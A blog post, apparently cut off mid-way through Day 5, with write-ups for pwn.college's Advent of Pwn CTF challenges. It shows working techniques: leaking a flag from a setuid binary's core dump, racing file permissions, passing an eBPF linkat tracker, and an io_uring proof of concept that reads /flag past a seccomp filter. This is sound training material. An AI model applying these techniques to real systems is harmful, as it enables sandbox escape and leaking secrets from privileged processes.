---
title:  "[CTF] PWN.COLLEGE - Advent of Pwn."
categories: [CTF, pwn.college]
---

![Logo](/assets/images/santa-cyber.png)

[Advent of Pwn](https://pwn.college/advent-of-pwn/) is an Advent CTF created by the awesome team at [ASU](https://www.asu.edu) behind [pwn.college](http://pwn.college/). This year was its first edtion. In this post I'll go through my solutions and share some of the things I've learnt along the way. Having time available mostly at odd evening hours, I finished only 9/12 challenges during the CTF and worked on the rest of them later. If you haven't stumbled upon [other](https://www.feyrer.de/CTF/CTF-Writeup-pwn.college-AdventOfPwn2025/) [solutions](https://jia.je/ctf-writeups/2025-12-01-advent-of-pwn-2025/) [already](https://github.com/hidehiroanto/ctf-writeups/tree/main/advent-of-pwn/2025) before landing on this page, please do check them out as you might find some more elegant ideas from seasoned CTF players. Especially for levels 5, which was a bit trickier, and 6 which had multiple solutions.  

Before going into the technical solutions, a few words about LLMs, which seem to be the theme nowadays. During the CTF I relied on LLMs for a couple of tasks which I believe they proved really useful at:
* Making sense of large amounts of code, high level or disassembly.
* Getting started with complicated subjects (e.g. understanding a custom blockchain).
* Repetitive tasks when speed or code quality is not a concern.

Multiple friends I've talked to during the CTF were skeptic about using LLMs and I definitely understand why. Some drawbacks I've experienced _continously_, not just during this CTF but in general:
* It's really easy to get directed to rabbit holes or ideas that don't lead anywhere.
* Very often they miss good ideas.
* They suggest paths which appear correct and seem to make sense, but are either very inefficient or simply wrong.
* On advanced topics, or things for which simply there's not much information available (for example level 5 shellcode for `io_uring` async I/O here), no amount of vibe-researching will get you to the solution.
* Again, not much chance against esoteric topics like pwn.college's [The Art of the Shell](https://pwn.college/shell-lin-do~148f65dd/) or [Linux Lunacy](https://pwn.college/linux-lunacy~9b739db1/) modules, which are awesome BTW.

Last but definitely not least, huge thanks to the creators of these challenges for the effort of designing and making them available for everyone!

Solutions and all challenge files to follow along are also on [GitHub](https://github.com/livz/advent-of-pwn). Challenge descriptions were fun to read but I think they didn't add much useful information towards solving them. So, for brevity I'm ommiting them here. 

[Day 1 - Warm-up gatekeeper](#day-1---warm-up-gatekeeper)<br>
[Day 2 - Dumpable SUID binary](#day-2---dumpable-suid-binary)<br>
[Day 3 - Sleeping nicely](#day-3---sleeping-nicely)<br>
[Day 4 - eBPF filters](#day-4---ebpf-filters)<br>
[Day 5 - io_uring syscall filter bypass](#day-5---io_uring-syscall-filter-bypass)<br>
[Day 6 - Custom blockchain](#day-6---custom-blockchain)<br>
[Day 7 - SSRFs chain](#day-7---ssrfs-chain)<br>

## Day 1 - Warm-up gatekeeper

In this challenge we're dealing with an ELF 😛 that performs some checks on its input:

```bash
$ file /challenge/check-list
/challenge/check-list: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=de16e5b4aea576aabe09d12729be47c53ff6e586, stripped

$ pwn checksec /challenge/check-list
[*] '/challenge/check-list'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
```

The code is really massive (1M+ lines of disassembly in Ghidra) but quite eays to understand. We're dealing with a large array of input bytes:
```nasm
mov     rbp, rsp
sub     rsp, 500h
mov     eax, 0
mov     edi, 0          ; fd
lea     rsi, [rbp+var_400] ; buf
mov     edx, 400h       ; count
syscall                 ; LINUX - sys_read
```

And thousands of basic operations (`sub` and `add`) applied on each element. Towards the end there are some checks on each array element. If we pass all the checks we get the flag:
```nasm
jnz     wrong_byte
cmp     [rbp+var_1], 7Dh ; '}'
jnz     wrong_byte
mov     rax, 1
mov     rdi, 1          ; fd
lea     rsi, bufCorrectStart ; buf
mov     rdx, 31h ; '1'  ; count
syscall                 ; LINUX - sys_write
mov     eax, 2
lea     rdi, filename   ; Open flag
mov     esi, 0          ; flags
mov     edx, 0          ; mode
syscall                 ; LINUX - sys_open
cmp     rax, 0
jl      short loc_AA40B6
mov     r12, rax
mov     eax, 0
mov     rdi, r12        ; fd
lea     rsi, [rbp+var_500] ; buf
mov     edx, 100h       ; count
syscall                 ; LINUX - sys_read
cmp     rax, 0
jle     short loc_AA40B6
mov     rcx, rax
mov     rax, 1
mov     rdi, 1          ; fd
lea     rsi, [rbp+var_500] ; buf
mov     rdx, rcx        ; count
syscall                 ; LINUX - sys_write
cmp     rax, 0
jl      short loc_AA40B6
mov     eax, 3Ch ; '<'
mov     edi, 0          ; error_code
syscall                 ; LINUX - sys_exit
```

For this level, once you understand what's happening a simple Python script can parse all the code, extract the operations and final value for each array element and reverse them to get the expected input key:
```python
~ python3 day-01-reconstruct-key.py
--- Key Reconstruction Complete ---
Key length: 1024 bytes

Successfully wrote the reconstructed key to 'reconstructed_key.bin' (binary format).
~ scp reconstructed_key.bin hacker@dojo.pwn.college:/home/hacker
reconstructed_key.bin
```

Then get the flag:
```bash
$ /challenge/check-list < reconstructed_key.bin
✨ Correct: you checked it twice, and it shows!
pwn.college{cqFsdOJjQoO-immwxNL7kN4DOFJ.QX4UDOxIDLzQDMyQzW}
```

## Day 2 - Dumpable SUID binary

Another ELF binary:
```bash
$ pwn checksec /challenge/claus
[*] '/challenge/claus'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

But this time we have its source:
```c
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char gift[256];

void wrap(char *gift, size_t size)
{
    fprintf(stdout, "Wrapping gift: [          ] 0%%");
    for (int i = 0; i < size; i++) {
        sleep(1);
        gift[i] = "#####\n"[i % 6];
        int progress = (i + 1) * 100 / size;
        int bars = progress / 10;
        fprintf(stdout, "\rWrapping gift: [");
        for (int j = 0; j < 10; j++) {
            fputc(j < bars ? '=' : ' ', stdout);
        }
        fprintf(stdout, "] %d%%", progress);
        fflush(stdout);
    }
    fprintf(stdout, "\n🎁 Gift wrapped successfully!\n\n");
}

void sigtstp_handler(int signum)
{
    puts("🎅 Santa won't stop!");
}

int main(int argc, char **argv, char **envp)
{
    uid_t ruid, euid, suid;

    if (getresuid(&ruid, &euid, &suid) == -1) {
        perror("getresuid");
        return 1;
    }

    if (euid != 0) {
        fprintf(stderr, "❌ Error: Santa must wrap as root!\n");
        return 1;
    }

    if (ruid != 0) {
        if (setreuid(0, -1) == -1) {
            perror("setreuid");
            return 1;
        }

        fprintf(stdout, "🦌 Now, Dasher! now, Dancer! now, Prancer and Vixen!\nOn, Comet! on Cupid! on, Donder and Blitzen!\n\n");
        execve("/proc/self/exe", argv, envp);

        perror("execve");
        return 127;
    }

    if (signal(SIGTSTP, sigtstp_handler) == SIG_ERR) {
        perror("signal");
        return 1;
    }

    int fd = open("/flag", O_RDONLY);
    if (fd == -1) {
        perror("open");
        return 1;
    }

    int count = read(fd, gift, sizeof(gift));
    if (count == -1) {
        perror("read");
        return 1;
    }

    wrap(gift, count);

    puts("🎄 Merry Christmas!\n");
    puts(gift);

    return 0;
}
```

Day 2 has a short init script that modifies the pattern for core files, to be in line with the challenge descrption:
```bash
#!/bin/sh

set -eu

mount -o remount,rw /proc/sys
echo coal > /proc/sys/kernel/core_pattern
mount -o remount,ro /proc/sys
```

The plan for this one is straight-forward: trigger a core dump then find the flag, which should still have been in memory. To do that, first make sure to set the core size:
```bash
$ ulimit -c
0
$ ulimit -c unlimited
$ ulimit -c
unlimited
```

There might be other ways but I went for a SIGQUIT (**Ctrl + \**))which triggers a core dump:
```bash
$ /challenge/claus
🦌 Now, Dasher! now, Dancer! now, Prancer and Vixen!
On, Comet! on Cupid! on, Donder and Blitzen!

Wrapping gift: [          ] 1%^\Quit (core dumped)

$ ls -al coal
-rw------- 1 root ubuntu 425984 Dec  2 19:41 coal
```

There are multiple ways to extract the flag as well, but I wanted to see if I could find it in the core using GDB:
```bash
gdb /challenge/claus ~/coal

gef➤  bt
#0  0x00007f51c4d86a7a in clock_nanosleep () from /lib/x86_64-linux-gnu/libc.so.6
#1  0x00007f51c4d93a27 in nanosleep () from /lib/x86_64-linux-gnu/libc.so.6
#2  0x00007f51c4da8c93 in sleep () from /lib/x86_64-linux-gnu/libc.so.6
#3  0x0000557a2330723d in wrap ()
#4  0x0000557a2330755b in main ()

gef➤  x/7i $rip
=> 0x557a2330755b <main+452>:   lea    rax,[rip+0xbf9]        # 0x557a2330815b
   0x557a23307562 <main+459>:   mov    rdi,rax
   0x557a23307565 <main+462>:   call   0x557a23307030 <puts@plt>
   0x557a2330756a <main+467>:   lea    rax,[rip+0x2b4f]        # 0x557a2330a0c0 <gift>
   0x557a23307571 <main+474>:   mov    rdi,rax
   0x557a23307574 <main+477>:   call   0x557a23307030 <puts@plt>
   0x557a23307579 <main+482>:   mov    eax,0x0

gef➤  x/s 0x557a2330a0c0
0x557a2330a0c0 <gift>:  "##n.college{4vYY1y_EKEbWDpks1zEp7C7y8mm.QX4cDOxIDLzQDMyQzW}\n"
```

## Day 3 - Sleeping nicely

<blockquote>
  <p>Only when children sleep sweetly and nice does Santa begin his flight</p>
</blockquote>

Despite having a massive description, this is another short and sweet one. The challenge has an init script which launches the folowing script in the background:

```bash
#!/bin/sh

set -eu

GIFT="$(cat /flag)"
rm /flag

touch /stocking

sleeping_nice() {
    ps ao ni,comm --no-headers \
        | awk '$1 > 0' \
        | grep -q sleep
}

# Only when children sleep sweetly and nice does Santa begin his flight
until sleeping_nice; do
    sleep 0.1
done

chmod 400 /stocking
printf "%s" "$GIFT" > /stocking

```

When nice sleep is detected, Santa will drop the flag, but not before making the stocking unreadble. Naughty! The idea is to open the `/stocking` file before Santa changes its permissions, then sleep nicely:

```bash
$ ls /stocking
-rw-r--r-- 1 root root 0 Dec  3 12:48 /stocking

$ tail -f /stocking
pwn.college{sucGPgrXk1E5Phyq-QhxTqXukrZ.QX0gDOxIDLzQDMyQzW}

- Challenge is already running. Start sleeping nicely

$ nice -n 10 sleep 1
```

## Day 4 - eBPF filters

Another init file which runs a compiled ELF binary, and its source is available. Since it's not very long, I'll paste it here:
```c
#define _GNU_SOURCE
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include <stdbool.h>
#include <ctype.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <unistd.h>

static volatile sig_atomic_t stop;

static void handle_sigint(int sig)
{
    (void)sig;
    stop = 1;
}

static int libbpf_print_fn(enum libbpf_print_level level,
                           const char *fmt, va_list args)
{
    return vfprintf(stderr, fmt, args);
}

static void broadcast_cheer(void)
{
    libbpf_set_print(libbpf_print_fn);
    libbpf_set_strict_mode(LIBBPF_STRICT_ALL);

    DIR *d = opendir("/dev/pts");
    struct dirent *de;
    char path[64];
    char flag[256];
    char banner[512];
    ssize_t n;

    if (!d)
        return;

    int ffd = open("/flag", O_RDONLY | O_CLOEXEC);
    if (ffd >= 0) {
        n = read(ffd, flag, sizeof(flag) - 1);
        if (n >= 0)
            flag[n] = '\0';
        close(ffd);
    } else {
        strcpy(flag, "no-flag\n");
    }

    snprintf(
        banner,
        sizeof(banner),
        "🎅 🎄 🎁 \x1b[1;31mHo Ho Ho\x1b[0m, \x1b[1;32mMerry Christmas!\x1b[0m\n"
        "%s",
        flag);

    while ((de = readdir(d)) != NULL) {
        const char *name = de->d_name;
        size_t len = strlen(name);
        bool all_digits = true;

        if (len == 0 || name[0] == '.')
            continue;
        if (strcmp(name, "ptmx") == 0)
            continue;

        for (size_t i = 0; i < len; i++) {
            if (!isdigit((unsigned char)name[i])) {
                all_digits = false;
                break;
            }
        }
        if (!all_digits)
            continue;

        snprintf(path, sizeof(path), "/dev/pts/%s", name);
        int fd = open(path, O_WRONLY | O_NOCTTY | O_CLOEXEC);
        if (fd < 0)
            continue;
        write(fd, "\x1b[2J\x1b[H", 7);
        write(fd, banner, strlen(banner));
        close(fd);
    }

    closedir(d);
}

int main(void)
{
    struct bpf_object *obj = NULL;
    struct bpf_program *prog = NULL;
    struct bpf_link *link = NULL;
    struct bpf_map *success = NULL;
    int map_fd;
    __u32 key0 = 0;
    int err;
    int should_broadcast = 0;

    libbpf_set_strict_mode(LIBBPF_STRICT_ALL);
    setvbuf(stdout, NULL, _IONBF, 0);

    obj = bpf_object__open_file("/challenge/tracker.bpf.o", NULL);
    if (!obj) {
        fprintf(stderr, "Failed to open BPF object: %s\n", strerror(errno));
        return 1;
    }

    err = bpf_object__load(obj);
    if (err) {
        fprintf(stderr, "Failed to load BPF object: %s\n", strerror(-err));
        goto cleanup;
    }

    prog = bpf_object__find_program_by_name(obj, "handle_do_linkat");
    if (!prog) {
        fprintf(stderr, "Could not find BPF program handle_do_linkat\n");
        goto cleanup;
    }

    link = bpf_program__attach_kprobe(prog, false, "__x64_sys_linkat");
    if (!link) {
        fprintf(stderr, "Failed to attach kprobe __x64_sys_linkat: %s\n", strerror(errno));
        goto cleanup;
    }

    signal(SIGINT, handle_sigint);
    signal(SIGTERM, handle_sigint);

    success = bpf_object__find_map_by_name(obj, "success");
    if (!success) {
        fprintf(stderr, "Failed to find success map\n");
        goto cleanup;
    }
    map_fd = bpf_map__fd(success);

    printf("Attached. Press Ctrl-C to quit.\n");
    fflush(stdout);
    while (!stop) {
        __u32 v = 0;
        if (bpf_map_lookup_elem(map_fd, &key0, &v) == 0 && v != 0) {
            should_broadcast = 1;
            stop = 1;
            break;
        }
        usleep(100000);
    }

    if (should_broadcast) {
        printf("Ho Ho Ho\n");
        broadcast_cheer();
    }

cleanup:
    if (link)
        bpf_link__destroy(link);
    if (obj)
        bpf_object__close(obj);
    return err ? 1 : 0;
}
```
Basically the challenge loads a BPF filter from a compiled object file - `tracker.bpf.o` (Sorry, no source code available this time), locates a BPF program (`handle_do_linkat`) and attaches a probe to it then gets a handle to a `success` map. It then continously checks for the presence of a first element in it with a value different than 0. To get an idea about the compiled eBPF filter, list all the sections:

```bash
$ llvm-objdump -h /challenge/tracker.bpf.o

/challenge/tracker.bpf.o:       file format elf64-bpf

Sections:
Idx Name                        Size     VMA              Type
  0                             00000000 0000000000000000
  1 .strtab                     0000008f 0000000000000000
  2 .text                       00000000 0000000000000000 TEXT
  3 kprobe/__x64_sys_linkat     000008a8 0000000000000000 TEXT
  4 .relkprobe/__x64_sys_linkat 00000030 0000000000000000
  5 license                     0000000d 0000000000000000 DATA
  6 .maps                       00000040 0000000000000000 DATA
  7 .BTF                        00000937 0000000000000000
  8 .rel.BTF                    00000030 0000000000000000
  9 .BTF.ext                    00000560 0000000000000000
 10 .rel.BTF.ext                00000530 0000000000000000
 11 .llvm_addrsig               00000004 0000000000000000
 12 .symtab                     00000090 0000000000000000
```

And then peek inside the custom `linkat` handler:
```bash
$ llvm-objdump -d -j kprobe/__x64_sys_linkat /challenge/tracker.bpf.o
 challenge/tracker.bpf.o:	file format elf64-bpf

Disassembly of section kprobe/__x64_sys_linkat:

0000000000000000 <handle_do_linkat>:
       0:	79 16 70 00 00 00 00 00	r6 = *(u64 *)(r1 + 0x70)
       1:	b7 01 00 00 00 00 00 00	r1 = 0x0
       2:	7b 1a d0 ff 00 00 00 00	*(u64 *)(r10 - 0x30) = r1
       3:	7b 1a c8 ff 00 00 00 00	*(u64 *)(r10 - 0x38) = r1
       4:	15 06 0e 01 00 00 00 00	if r6 == 0x0 goto +0x10e <handle_do_linkat+0x898>
       5:	bf 63 00 00 00 00 00 00	r3 = r6
       6:	07 03 00 00 68 00 00 00	r3 += 0x68
       7:	bf a1 00 00 00 00 00 00	r1 = r10
       8:	07 01 00 00 d0 ff ff ff	r1 += -0x30
       9:	b7 02 00 00 08 00 00 00	r2 = 0x8
      10:	85 00 00 00 71 00 00 00	call 0x71
      11:	07 06 00 00 38 00 00 00	r6 += 0x38
      12:	bf a1 00 00 00 00 00 00	r1 = r10
      13:	07 01 00 00 c8 ff ff ff	r1 += -0x38
      14:	b7 02 00 00 08 00 00 00	r2 = 0x8
      15:	bf 63 00 00 00 00 00 00	r3 = r6
      16:	85 00 00 00 71 00 00 00	call 0x71
      17:	79 a3 d0 ff 00 00 00 00	r3 = *(u64 *)(r10 - 0x30)
      18:	15 03 00 01 00 00 00 00	if r3 == 0x0 goto +0x100 <handle_do_linkat+0x898>
      19:	79 a1 c8 ff 00 00 00 00	r1 = *(u64 *)(r10 - 0x38)
      20:	15 01 fe 00 00 00 00 00	if r1 == 0x0 goto +0xfe <handle_do_linkat+0x898>
      21:	bf a1 00 00 00 00 00 00	r1 = r10
      22:	07 01 00 00 d8 ff ff ff	r1 += -0x28
      23:	b7 02 00 00 10 00 00 00	r2 = 0x10
      24:	85 00 00 00 72 00 00 00	call 0x72
      25:	67 00 00 00 20 00 00 00	r0 <<= 0x20
      26:	c7 00 00 00 20 00 00 00	r0 s>>= 0x20
      27:	b7 01 00 00 01 00 00 00	r1 = 0x1
      28:	6d 01 f6 00 00 00 00 00	if r1 s> r0 goto +0xf6 <handle_do_linkat+0x898>
      29:	79 a3 d0 ff 00 00 00 00	r3 = *(u64 *)(r10 - 0x30)
      30:	bf a1 00 00 00 00 00 00	r1 = r10
      31:	07 01 00 00 f0 ff ff ff	r1 += -0x10
      32:	b7 02 00 00 10 00 00 00	r2 = 0x10
      33:	85 00 00 00 72 00 00 00	call 0x72
      34:	67 00 00 00 20 00 00 00	r0 <<= 0x20
      35:	77 00 00 00 20 00 00 00	r0 >>= 0x20
      36:	55 00 ee 00 07 00 00 00	if r0 != 0x7 goto +0xee <handle_do_linkat+0x898>
      37:	71 a1 f0 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0x10)
      38:	55 01 ec 00 73 00 00 00	if r1 != 0x73 goto +0xec <handle_do_linkat+0x898> // s
      39:	71 a1 f1 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xf)
      40:	55 01 ea 00 6c 00 00 00	if r1 != 0x6c goto +0xea <handle_do_linkat+0x898> // l
      41:	71 a1 f2 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xe)
      42:	55 01 e8 00 65 00 00 00	if r1 != 0x65 goto +0xe8 <handle_do_linkat+0x898> // e
      43:	71 a1 f3 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xd)
      44:	55 01 e6 00 69 00 00 00	if r1 != 0x69 goto +0xe6 <handle_do_linkat+0x898> // i
      45:	71 a1 f4 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xc)
      46:	55 01 e4 00 67 00 00 00	if r1 != 0x67 goto +0xe4 <handle_do_linkat+0x898> // g
      47:	71 a1 f5 ff 00 00 00 00	r1 = *(u8 *)(r10 - 0xb)
      48:	55 01 e2 00 68 00 00 00	if r1 != 0x68 goto +0xe2 <handle_do_linkat+0x898> // h
      49:	79 a3 c8 ff 00 00 00 00	r3 = *(u64 *)(r10 - 0x38)
      50:	bf a1 00 00 00 00 00 00	r1 = r10
      51:	07 01 00 00 d8 ff ff ff	r1 += -0x28
      52:	b7 02 00 00 10 00 00 00	r2 = 0x10
      53:	85 00 00 00 72 00 00 00	call 0x72
      54:	67 00 00 00 20 00 00 00	r0 <<= 0x20
      55:	c7 00 00 00 20 00 00 00	r0 s>>= 0x20
      56:	b7 01 00 00 01 00 00 00	r1 = 0x1
 [...]
```

The disassembly is quite large but repetitive. At this point I used an LLM to do a first pass thrugh the decompiled code with mixed results. What I got was that the binary running as SUID _will broadcast the flag when an unprivileged process executes the linkat system call, and the newpath argument must point to a string that exactly matches: "prancer"_. Although this wasn't correct, it was a good starting point. 

Before recovering all the expected arguments to `linkat` from the disassembly, I wanted to understand a bit more the eBPF filter, so I recompiled the binary with debug information. To do this, we need `libbpf` and some includes:

```bash
$ LIBBPF_ROOT=/nix/store/b9zasiadhppl3kbn3jlfvvssc35hhavq-libbpf-1.5.0

$ sudo gcc -o northpole -Wall -g northpole.c \
-I${LIBBPF_ROOT}/include \
-L${LIBBPF_ROOT}/lib \
-lbpf
```

The BPF program actually defines two maps:
```bash
$ sudo bpftool map show
1: array  name progress  flags 0x0
	key 4B  value 4B  max_entries 1  memlock 272B
	btf_id 12
2: array  name success  flags 0x0
	key 4B  value 4B  max_entries 1  memlock 272B
	btf_id 12
```

The first one is used to track the progress from one link to another, almost like a state machine. That's why the order of the link operations matter (more on this next). The second map is the one checked by the C program for success. We can also dump the maps with `bpftool`:
```bash
$ sudo bpftool map dump name progress
[{
        "key": 0,
        "value": 1
    }
]
$ sudo bpftool map dump name success
[{
        "key": 0,
        "value": 0
    }
]
```
Or even manually set values for elements, to confirm the understanding of the code is correct:
```bash
$ sudo bpftool map update name success key hex 00 00 00 00 value hex 01 00 00 00
$ sudo bpftool map dump name success
[{
        "key": 0,
        "value": 1
    }
]
```

To trigger the winning path we need a chain of link operations. Let's see if this works or not:
```bash
$ touch sleigh
$ sudo bpftool map dump name progress
[{
        "key": 0,
        "value": 0
    }
]
$ ln sleigh dasher
$ sudo bpftool map dump name progress
[{
        "key": 0,
        "value": 1
    }
]
```
We made progress! Next step was to get the name of the other reindeers and their order (_which by the way it doesn't match the song, so you still have to find them all_) and get the 🚩:
```bash
$ touch sleigh
$ ln sleigh dasher
$ ln sleigh dancer
$ ln sleigh prancer
$ ln sleigh vixen
$ ln sleigh comet
$ ln sleigh cupid
$ ln sleigh donner
$ ln sleigh blitzen

🎅 🎄 🎁 Ho Ho Ho, Merry Christmas!
pwn.college{I5Wgtp3zwRZOMihukp1FJYbSqCP.QXykDOxIDLzQDMyQzW}
```

## Day 5 - io_uring syscall filter bypass

<blockquote>
Dashing through the code,<br>
In a one-ring I/O sled,<br>
O’er the syscalls go,<br>
No blocking lies ahead!<br>
Buffers queue and spin,<br>
Completions shining bright,<br>
What fun it is to read and write,<br>
Async I/O tonight — hey!
</blockquote>

For this challenge the description is short but the solution took me a while to get it right (_especially the shellcode part_). The challlenge code is also short and very easy to understand:
```c
#include <errno.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>

#define NORTH_POLE_ADDR (void *)0x1225000

int setup_sandbox()
{
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0) {
        perror("prctl(NO_NEW_PRIVS)");
        return 1;
    }

    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
    if (!ctx) {
        perror("seccomp_init");
        return 1;
    }

    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(io_uring_setup), 0) < 0 ||
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(io_uring_enter), 0) < 0 ||
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(io_uring_register), 0) < 0 ||
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0) < 0) {
        perror("seccomp_rule_add");
        return 1;
    }

    if (seccomp_load(ctx) < 0) {
        perror("seccomp_load");
        return 1;
    }

    seccomp_release(ctx);

    return 0;
}

int main()
{
    void *code = mmap(NORTH_POLE_ADDR, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (code != NORTH_POLE_ADDR) {
        perror("mmap");
        return 1;
    }

    srand(time(NULL));
    int offset = (rand() % 100) + 1;

    puts("🛷 Loading cargo: please stow your sled at the front.");

    if (read(STDIN_FILENO, code, 0x1000) < 0) {
        perror("read");
        return 1;
    }

    puts("📜 Checking Santa's naughty list... twice!");
    if (setup_sandbox() != 0) {
        perror("setup_sandbox");
        return 1;
    }

    // puts("❄️ Dashing through the snow!");
    ((void (*)())(code + offset))();

    // puts("🎅 Merry Christmas to all, and to all a good night!");
    return 0;
}
```
The idea is clear: all the syscalls except `io_uring_setup`, `io_uring_enter` and `io_uring_register` are blocked and we get a mapped memory page to store some shellcode to be executed. Straght-forward but there are a few difficult things to overcome here:
* Not much code showing how to work with `io_uring` is available online (So not much material for LLMs to train with)
* `io_uring_setup` syscall returns a file descriptor which needs to be `mmap`-ed, but `mmap` syscall is not allowed!
* There's a large number of structures and member fields involved, whose offsets differ from one kernel version to another (So an LLM will likely fail to generate any working shellcode)

My plan was as follows:
1. Locate a working example for `io_uring` async I/O.
2. Adapt the example to open a file, read and write its content to stdout.
3. Convert it to shellcode and feed it to the challenge binary
4. Enjoy!

Luckily, towards the end of the `io_uring` [man page](https://man7.org/linux/man-pages/man7/io_uring.7.html) there's an example that uses `io_uring` to copy stdin to stdout. Nice, let's see if it works:
```bash
$ gcc io_uring_orig.c -o io_uring
ubuntu@2025~day-05:~$ ./io_uring
hello
hello
```

Next, clean the code and adapt it to read and print the flag:
```bash
$ gcc io_uring_mod.c -o io_uring
ubuntu@practice~2025~day-05:~$ sudo ./io_uring
pwn.college{practice}
```

But how to get rid of the `mmap` calls?  By default, `io_uring` allocates kernel memory for submission queue and completion queue, that callers must subsequently `mmap`.  However, consulting the `io_uring_setup` man page I noticed the `IORING_SETUP_NO_MMAP` flag. As per documentaiont, if this flag is set, `io_uring` instead uses caller-allocated buffers:  `p->cq_off.user_addr` must point to the memory for the `sq`/`cq` rings, and `p->sq_off.user_addr` must point to the memory for the `sqes`. Neat! 

I've trimmed the PoC even more and simulated the conditions of the challege binary with two page-aligned (very important) buffers on the stack:
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <linux/io_uring.h>
#include <stdlib.h>
#include <errno.h>

/* Define Page Size */
#define PAGE_SIZE 4096

static int ring_fd;
static struct io_uring_sqe *sqes;
static struct io_uring_cqe *cqes;

static uint32_t *sq_tail, *sq_head, *sq_mask;
static uint32_t *cq_tail, *cq_head, *cq_mask;

static inline int enter_syscall(int to_submit, int min_complete) {
    return syscall(__NR_io_uring_enter, ring_fd,
                   to_submit, min_complete,
                   IORING_ENTER_GETEVENTS, NULL, 0);
}

/* setup accepts pointers to the pre-allocated stack memory */
static void setup(void *rings_ptr, void *sqes_ptr) {
    struct io_uring_params p = {0};

    p.sq_entries = 1;
    p.cq_entries = 1;
    p.flags = IORING_SETUP_NO_MMAP | IORING_SETUP_NO_SQARRAY;

    /* Tell kernel where the memory is */
    p.cq_off.user_addr = (uint64_t)(unsigned long)rings_ptr;
    p.sq_off.user_addr = (uint64_t)(unsigned long)sqes_ptr;

    ring_fd = syscall(__NR_io_uring_setup, 8, &p);
    if (ring_fd < 0) {
        perror("io_uring_setup");
        exit(1);
    }

    /* SQEs: user-provided sqes_ptr */
    sqes = (struct io_uring_sqe *)sqes_ptr;

    /* Map offsets to our stack buffer */
    void *ring_base = rings_ptr;
    sq_head = (uint32_t *)((char *)ring_base + p.sq_off.head);
    sq_tail = (uint32_t *)((char *)ring_base + p.sq_off.tail);
    sq_mask = (uint32_t *)((char *)ring_base + p.sq_off.ring_mask);

    cq_head = (uint32_t *)((char *)ring_base + p.cq_off.head);
    cq_tail = (uint32_t *)((char *)ring_base + p.cq_off.tail);
    cq_mask = (uint32_t *)((char *)ring_base + p.cq_off.ring_mask);
    cqes = (struct io_uring_cqe *)((char *)ring_base + p.cq_off.cqes);
}

static int submit_sqe(struct io_uring_sqe *sqe) {
    uint32_t t = *sq_tail;
    uint32_t idx = t & *sq_mask;
    printf("[*] submit_sqe: %d\n", idx);

    memcpy(&sqes[idx], sqe, sizeof(*sqe));
    *sq_tail = t + 1;

    if (enter_syscall(1, 1) < 0) { perror("enter"); _exit(1); }

    while (*cq_head == *cq_tail) ;
    uint32_t cidx = *cq_head & *cq_mask;
    int res = cqes[cidx].res;
    (*cq_head)++;

    return res;
}

int main() {
    /* 1. Allocate on Stack 
       2. Use __attribute__((aligned(PAGE_SIZE)))
       3. Zero out memory (mmap does this automatically, stack does not)
    */
    uint8_t rings_stack[PAGE_SIZE] __attribute__((aligned(PAGE_SIZE)));
    uint8_t sqes_stack[PAGE_SIZE] __attribute__((aligned(PAGE_SIZE)));

    memset(rings_stack, 0, PAGE_SIZE);
    memset(sqes_stack, 0, PAGE_SIZE);

    /* Pass stack addresses to setup */
    setup(rings_stack, sqes_stack);

    char path[] = "/flag";
    char buf[4096];

    struct io_uring_sqe sqe;
    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode = IORING_OP_OPENAT;
    sqe.fd = AT_FDCWD;
    sqe.addr = (unsigned long)path;
    sqe.open_flags = O_RDONLY;

    int fd = submit_sqe(&sqe);
    if (fd < 0) {
        write(2, "open failed\n", 12);
        return 1;
    }
    printf("[*] File opened with fd: %x\n", fd);

    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode = IORING_OP_READ;
    sqe.fd = fd;
    sqe.addr = (unsigned long)buf;
    sqe.len = sizeof(buf);

    int r = submit_sqe(&sqe);
    if (r < 0) {
        write(2, "read failed\n", 12);
        return 1;
    }

    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode = IORING_OP_WRITE;
    sqe.fd = 1;
    sqe.addr = (unsigned long)buf;
    sqe.len = r;

    submit_sqe(&sqe);

    return 0;
}
```

With this simple code I got the flag without the need to `mmap` anything:

```bash
$ gcc io_uring_nommap.c -o io_uring
$ sudo ./io_uring
[*] submit_sqe: 0
[*] File opened with fd: 4
[*] submit_sqe: 1
[*] submit_sqe: 2
pwn.college{practice}
```

At this point I didn't realise I could have converted my PoC straight to working assembly code as other have done (_check the writeups mentioend in the beginning!_) and I manually converted this to shellcode. To make my job easier I minimised the PoC code even more and replaced all the defines with their actual values. I also made all the access to structure members to be offset-based (these offsets vary from one kernel version to another!) using the `offsetof` macro:
```c
